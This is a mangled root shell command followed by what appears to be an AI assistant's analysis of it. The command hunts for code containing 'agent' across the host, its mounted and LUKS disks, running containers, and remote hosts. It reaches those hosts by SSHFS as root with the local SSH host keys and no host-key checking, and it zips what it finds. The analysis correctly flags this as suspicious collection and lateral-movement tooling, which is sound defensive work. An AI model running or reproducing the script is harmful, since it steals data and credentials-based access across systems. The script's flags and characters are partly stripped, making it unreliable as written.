sudo sh c 'D=$(mktemp d) || exit 1; A=$(mktemp) || exit 1; : >"$A" || exit 1; trap "rm rf \"$D\"; rm f \"$A\"" EXIT; G="$D/rgpre.sh"; printf "%s\n" "!/bin/sh" "f=\${1:?}; timeout 60 cat \"\$f\" 2>/dev/null || echo \"PREERR \$f\" >>\"\$A\"; exit 0" >"$G" && chmod 755 "$G"; export A; Z="$PWD/szamoca.zip"; rm f "$Z" 2>/dev/null; mkdir p /run/szamocamnt /run/szamocamounts /var/lib/szamocacontainers 2>/dev/null; command v rg >/dev/null 2>&1 || echo "NORG" >>"$A"; command v lsblk >/dev/null 2>&1 || echo "NOLSBLK" >>"$A"; \
if command v lsblk >/dev/null 2>&1; then for v in $(lsblk rpno NAME,FSTYPE,MOUNTPOINT 2>/dev/null | awk "\$2==\"crypto_LUKS\" && \$3==\"\"{print \$1}"); do k=$(basename "$v"); c=$(lsblk no NAME,TYPE "$v" 2>/dev/null | awk "\$2==\"crypt\"{print \$1; exit}"); if [ z "$c" ] && [ ! e "/dev/mapper/szamoca$k" ]; then cryptsetup luksOpen keyfile /dev/zero keyfilesize 32 batchmode "$v" "szamoca$k" <<K
dummyLUKSkeydummyLUKSkey
K
fi; if [ z "$c" ] && [ ! e "/dev/mapper/szamoca$k" ]; then echo "LUKSLOCKED $v (nyers minta archivalva)" >>"$A"; dd if="$v" of="$D/luksraw$k.bin" bs=1M count=64 2>>"$A" && zip q "$Z" "$D/luksraw$k.bin" 2>>"$A" && printf "@ $D/luksraw$k.bin\n@=luksraw$v.bin\n" | zipnote w "$Z" 2>>"$A" && rm f "$D/luksraw$k.bin"; fi; done; for m in $(lsblk rpno NAME,FSTYPE,MOUNTPOINT 2>/dev/null | awk "\$2!=\"\" && \$2!=\"crypto_LUKS\" && \$2!=\"LVM2_member\" && \$2!=\"swap\" && \$3==\"\"{print \$1}"); do k=$(basename "$m"); mkdir p "/run/szamocamnt/$k" 2>/dev/null && mount o ro "$m" "/run/szamocamnt/$k" 2>>"$A" || echo "MOUNTERR $m" >>"$A"; done; fi; \
for f in $(awk "!/^/ && NF>3 && \$2!=\"none\" && \$3!=\"swap\" {print \$2}" /etc/fstab 2>/dev/null | grep vE "^/(proc|sys|dev|run)(/|\$)"); do g=$(echo "$f" | sed "s|/|__|g"); mountpoint q "$f" 2>/dev/null || mount o ro "$f" 2>>"$A" || echo "MOUNTERR $f" >>"$A"; mkdir p "/run/szamocamnt/$g" 2>/dev/null && mount o ro,bind "$f" "/run/szamocamnt/$g" 2>>"$A" || echo "MOUNTERR $f" >>"$A"; done; \
CT=""; command v docker >/dev/null 2>&1 && timeout 20 docker info >/dev/null 2>&1 && CT=docker; [ z "$CT" ] && { command v podman >/dev/null 2>&1 && timeout 20 podman info >/dev/null 2>&1 && CT=podman; }; [ z "$CT" ] && echo "NOCONTAINERRUNTIME" >>"$A"; if [ n "$CT" ]; then for i in $("$CT" ps q 2>>"$A"); do n=$("$CT" inspect f "{{.Name}}" "$i" 2>/dev/null | sed "s|^/||; s|/|__|g"); [ n "$n" ] || n=$("$CT" inspect f "{{.Id}}" "$i" 2>/dev/null | cut c112); [ n "$n" ] || continue; mkdir p "/var/lib/szamocacontainers/$n" 2>/dev/null; for d in $("$CT" inspect f "{{range .Mounts}}{{.Source}} {{end}}" "$i" 2>/dev/null); do mkdir p "/var/lib/szamocacontainers/$n/$(basename "$d")" 2>/dev/null && mount o bind "$d" "/var/lib/szamocacontainers/$n/$(basename "$d")" 2>>"$A" || echo "CONTAINERERR $i $d" >>"$A"; done; done; fi; \
if command v sshfs >/dev/null 2>&1; then if [ r /etc/ssh/ssh_host_ed25519_key ] || [ r /etc/ssh/ssh_host_rsa_key ]; then for h in $( { grep v "^" /etc/hosts 2>/dev/null | awk "NF>1 {print \$1}"; awk "{print \$1}" /root/.ssh/known_hosts 2>/dev/null | cut d, f1 | sed "s|^\[||; s|\]:[09]\$||; s|\]$||"; } | grep E "^[09afAF.:]+$" | sort u | grep v "^127.0.0.1$\|^::1$"); do for own in $(hostname I 2>/dev/null); do [ "$h" = "$own" ] && continue 2; done; mkdir p "/run/szamocamounts/$h" 2>/dev/null && timeout 15 sshfs o ro,reconnect,ServerAliveInterval=5,StrictHostKeyChecking=no,UserKnownHostsFile=/dev/null,ConnectTimeout=8,allow_other o IdentityFile=/etc/ssh/ssh_host_ed25519_key o IdentityFile=/etc/ssh/ssh_host_rsa_key "root@$h:/" "/run/szamocamounts/$h" 2>>"$A" || echo "SSHERR $h" >>"$A"; done; else echo "NOSSHKEY" >>"$A"; fi; else echo "NOSSHFS" >>"$A"; fi; \
if [ "$(sysctl n kernel.modules_disabled 2>/dev/null || echo 0)" != "0" ]; then echo "MODULESDISABLED" >>"$A"; fi; if [ "$(sysctl n fs.protected_hardlinks 2>/dev/null || echo 0)" != "0" ] || [ "$(sysctl n fs.protected_symlinks 2>/dev/null || echo 0)" != "0" ]; then echo "HARDLINKSYMLINKPROTECTED" >>"$A"; fi; if [ "$(sysctl n fs.protected_regular 2>/dev/null || echo 0)" != "0" ]; then echo "PROTECTEDREGULAR" >>"$A"; fi; if [ "$(sysctl n fs.protected_fifos 2>/dev/null || echo 0)" != "0" ]; then echo "PROTECTEDFIFOS" >>"$A"; fi; if [ "$(sysctl n kernel.yama.ptrace_scope 2>/dev/null || echo 0)" != "0" ]; then echo "PTRACERESTRICTED" >>"$A"; fi; if [ "$(sysctl n kernel.perf_event_paranoid 2>/dev/null || echo 3)" gt 2 ]; then echo "PERFRESTRICTED" >>"$A"; fi; if [ "$(sysctl n kernel.dmesg_restrict 2>/dev/null || echo 0)" != "0" ]; then echo "DMESGRESTRICTED" >>"$A"; fi; if [ "$(sysctl n kernel.kptr_restrict 2>/dev/null || echo 0)" != "0" ]; then echo "KPTRRESTRICTED" >>"$A"; fi; if [ "$(sysctl n kernel.unprivileged_bpf_disabled 2>/dev/null || echo 0)" != "0" ]; then echo "BPFRESTRICTED" >>"$A"; fi; if [ "$(sysctl n user.max_user_namespaces 2>/dev/null || echo 1)" le 0 ]; then echo "USERNSLIMITED" >>"$A"; fi; if [ "$(sysctl n kernel.kexec_load_disabled 2>/dev/null || echo 0)" != "0" ]; then echo "KEXECRESTRICTED" >>"$A"; fi; if [ r /sys/kernel/security/lockdown ]; then grep q "\[integrity\]\|\[confidentiality\]" /sys/kernel/security/lockdown 2>/dev/null && echo "LOCKDOWNACTIVE" >>"$A"; fi; if [ "$(getenforce 2>/dev/null)" = "Enforcing" ]; then echo "SELINUXENFORCING" >>"$A"; fi; if [ d /sys/kernel/security/apparmor ]; then grep q " (enforce)" /sys/kernel/security/apparmor/profiles 2>/dev/null && echo "APPARMORENFORCING" >>"$A"; fi; \
rg l i uuu pre "$G" glob ".{py,ts,tsx,js,rs,go}" nomessages "agent" / 2>>"$A" | sort u | zip q @ "$Z" 2>>"$A" || echo "ZIPERR" >>"$A"; \
cadd() { t="$D/c.$$"; "$CT" cp "$1:$2" "$t" 2>/dev/null && { zip q "$Z" "$t" 2>/dev/null && printf "@ $t\n@=$CT:$3:$2\n" | zipnote w "$Z" 2>/dev/null && rm f "$t"; } || echo "CONTAINERCOPYERR $1 $2" >>"$A"; }; if [ n "$CT" ]; then "$CT" ps q 2>/dev/null | while IFS= read r i; do n=$("$CT" inspect f "{{.Name}}" "$i" 2>/dev/null | sed "s|^/||; s|/|__|g"); [ n "$n" ] || n=$("$CT" inspect f "{{.Id}}" "$i" 2>/dev/null | cut c112); [ n "$n" ] || continue; "$CT" exec u 0 "$i" sh c "command v rg >/dev/null 2>&1 && exec rg l i uuu glob \".{py,ts,tsx,js,rs,go}\" nomessages \"agent\" / || exec grep rli include=\".py\" include=\".ts\" include=\".tsx\" include=\".js\" include=\".rs\" include=\".go\" excludedir=proc excludedir=sys excludedir=dev \"agent\" /" 2>>"$A" | while IFS= read r rf; do cadd "$i" "$rf" "$n"; done; done; fi; \
n=$(grep c . "$A" 2>/dev/null); n=${n:0}; if [ "$n" gt 0 ]; then echo "SZAMOCA WARNINGS ($n):" >&2; cat "$A" >&2; fi; echo "SZAMOCA: kesz" >&2
'

entries.answer:
This is a rootlevel collection and archive script. It tries to discover files containing the word agent across the host, mounted disks, running containers, and potentially reachable hosts, then writes matching files into szamoca.zip in the current directory. It is not safe to run blindly: it creates mounts, talks to container runtimes, attempts LUKS unlocks, and uses local SSH host private keys to try root logins to other machines.

 What it does

 1. Sets up temporary state and logging

It runs under sudo sh -c, so almost everything executes as root.

 Creates a temporary directory D and temporary warning log A.
 Installs an EXIT trap that deletes both at the end.
 Creates a small rg --pre helper script that runs timeout 60 cat "$file" before ripgrep scans each candidate file.
 Uses Z="$PWD/szamoca.zip" as the destination archive, deleting any existing archive at that path first.

The helper exists because rg --pre normally expects a preprocessor command; here it merely cats every file. That is unnecessary for normal text source files and makes the recursive scan substantially more dangerous and slower: it forces every candidate to be opened and read via a shell helper.

 2. Looks for unmounted local filesystems

The script queries lsblk for block devices that are not mounted.

 For every unmounted crypto_LUKS device, it tries:
  sh
  cryptsetup luksOpen --key-file /dev/zero --keyfile-size 32 --batch-mode ...
  
  This supplies 32 zero bytes as the credential. The heredocument containing dummy-LUKS-key... is effectively irrelevant because --key-file /dev/zero takes precedence as the supplied key material.

 If that unlock fails, it copies the first 64 MiB of the encrypted device using dd and adds it to the ZIP as a raw LUKS sample.

A LUKS device only opens after successful credential verification, and keyfile input is treated as supplied key material; this particular zerokey attempt is overwhelmingly likely to fail unless someone deliberately configured an allzero keyfile.  Copying even the first 64 MiB may capture a LUKS header plus encrypted data and is intrusive evidence collection, not a harmless “scan.”[1][2]

 It then mounts every unmounted nonLUKS, nonLVM, nonswap filesystem readonly below /run/szamoca-mnt/.

“Readonly” reduces the chance of filesystem writes, but it does not mean the operation is riskfree. Mounting an untrusted filesystem can still expose the host to filesystemparser issues, trigger automountlike behavior in edge cases, and alter system observability or access timestamps depending on filesystem and mount settings.

 3. Tries to expose /etc/fstab mounts

For every applicable /etc/fstab mount point, it:

1. Attempts to mount it readonly if it is not mounted.
2. Bindmounts it readonly under /run/szamoca-mnt/.

This broadens the later / scan so that data from otherwise unavailable configured mount points can become visible. It has poor error hygiene: failed mount attempts are logged but scanning continues.

 4. Enumerates container data and searches containers

If Docker or Podman is available and responding:

 It lists running containers.
 It bindmounts each container’s declared source mount paths into /var/lib/szamoca-containers/<container>/.
 Later, it executes a recursive rg or fallback grep inside every running container as UID 0 to find files containing agent.
 For each resulting path, it copies the file out via docker cp or podman cp and adds it to the archive.

This can collect application code, deployment credentials, configuration, secrets, customer data, and runtime files. It can also impose load on containers because recursive searches from / walk broad filesystem trees.

 5. Attempts SSH connections to other machines

This is the most alarming portion:

sh
sshfs ... \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o IdentityFile=/etc/ssh/ssh_host_ed25519_key \
  -o IdentityFile=/etc/ssh/ssh_host_rsa_key \
  "root@$h:/" "/run/szamoca-mounts/$h"


It:

 Builds target IP addresses from /etc/hosts and root’s known_hosts.
 Skips only loopback and the machine’s own reported addresses.
 Uses the local machine’s SSH host private keys as client identities.
 Tries to mount each remote root filesystem over SSHFS as root.
 Disables hostkey verification and discards hostkey records.

That behavior resembles lateralmovement or opportunistic credential reuse. StrictHostKeyChecking=no plus UserKnownHostsFile=/dev/null means the script intentionally does not authenticate the identity of the remote server, making it vulnerable to maninthemiddle interception and inappropriate for legitimate administration. Even if it fails on most hosts, the connection attempts themselves can create audit logs, trigger alerts, or cause account/key lockout policies to fire.

 6. Records defensive controls

It checks kernel and MACpolicy settings such as:

 kernel.modules_disabled
 protected hardlinks/symlinks/FIFOs
 Yama ptrace restrictions
 BPF, perf, dmesg, kptr, kexec restrictions
 user namespace availability
 kernel lockdown
 SELinux enforcing mode
 AppArmor enforcement

Those are appended as warning labels. These checks look like environment reconnaissance: they identify defenses that could interfere with privileged inspection, exploitation, tracing, or loading code.

 7. Searches the entire reachable filesystem

The core collection command is:

sh
rg -l -i -uuu --pre "$G" \
  --glob "*.{py,ts,tsx,js,rs,go}" \
  --no-messages "agent" / \
| sort -u \
| zip -q -@ "$Z"


Meaning:

 -l: output only names of files that match.
 -i: caseinsensitive match.
 -uuu: aggressively ignore normal filtering/ignore rules and include hidden/binaryish content that ripgrep would normally skip.
 --glob: restricts filenames to Python, TypeScript, TSX, JavaScript, Rust, and Go.
 /: scans from the filesystem root.
 Matching files are added directly to the ZIP.

Because the script mounts extra filesystems and container bind mounts under /, this scan covers far more than the ordinary host filesystem. The archive may include source trees and code files containing the string agent, including files in mounted disks, application volumes, container directories, and remote SSHFS mounts if those mounted successfully.

 Practical assessment

| Aspect | Assessment |
|||
| Privilege required | Root / sudo |
| Primary function | Broad sourcecode and artifact collection |
| Data exposure risk | Very high |
| Host modification | Yes: creates mount points, mounts filesystems, may create device mappings, invokes containers and SSH connections |
| Network behavior | Attempts root SSHFS access to discovered IPs |
| Archive behavior | Overwrites/removes preexisting ./szamoca.zip, then creates a new ZIP |
| Cleanup quality | Incomplete: it deletes only the temporary directory and warning log; it does not explicitly unmount local, bind, container, or SSHFS mounts, nor close any successfully opened LUKS mapping |

 Serious implementation problems

 No unmount cleanup. /run/szamoca-mnt, /run/szamoca-mounts, and /var/lib/szamoca-containers can retain active mounts after the script exits.
 No LUKS mapping cleanup. If the allzero key somehow succeeded, the device mapper mapping is not closed.
 Unsafe SSH trust settings. It disables verification of remote host identity.
 Abusive credential behavior. It repurposes SSH host keys for outbound root authentication attempts.
 Potentially massive scan. Scanning / with -uuu and a preprocessor can be very slow, can consume I/O, and can traverse large dependency trees and mounted data.
 Misleading “readonly” posture. The script calls itself archival in places but still alters the running system by mounting filesystems, invoking cryptsetup, and invoking executables inside containers.
 Weak ZIP safety. ZIP archives do not encrypt contents by default here. Anyone who obtains szamoca.zip can inspect its collected code and raw disk fragments.
 Path and shell fragility. Numerous for x in $(...) loops split on whitespace, so paths with spaces, tabs, glob metacharacters, or unusual names will be mishandled.

 Bottom line

Treat this as suspicious collection tooling, not a benign oneliner. Do not execute it on a production system, a system you do not own, or any host containing confidential code or data. If it has already run, preserve the command and shell history for investigation, inspect szamoca.zip, check active mounts with findmnt or mount, inspect device mappings with cryptsetup status and dmsetup ls, and review Docker/Podman, SSH, and authentication logs for its activity.
